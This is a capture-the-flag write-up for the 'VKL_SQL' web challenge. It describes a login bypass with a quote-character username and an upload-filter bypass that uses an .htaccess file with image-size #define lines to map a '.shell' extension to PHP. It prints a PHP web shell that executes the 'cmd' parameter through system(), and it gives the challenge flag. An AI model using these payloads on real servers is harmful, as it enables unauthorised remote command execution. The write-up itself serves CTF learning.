VKL_SQL
===
**Category**: Web

**Poins**: 496 (8 solves)

**Author**: Rosee
### Description
```
You are a professional hacker, please control it
Note: Flag is in /etc/flag.txt
```
### Solution
- First we need to login. We can bypass login with username `"` and password null.
- After bypass login, we see upload file. But upload any file we got a message `size 1337 :)`
- We can upload the `.htaccess` file with 
```
#define width 1337
#define height 1337
```
to bypass size 1337 and `AddType application/x-httpd-php .shell` to upload my shell.
##### Final payload
- First upload file `.htaccess`
```
#define width 1337
#define height 1337

AddType application/x-httpd-php .shell
```
- After upload file `payload.shell`
```
#define width 1337
#define height 1337

<?php
echo system("$_GET['cmd']");
?>
```
- Final access `?cmd=cat flag.txt` to get flag
### Flag
- `darkCON{am4zing_go0d_j0bb_my_Fri3nd_!!!}`
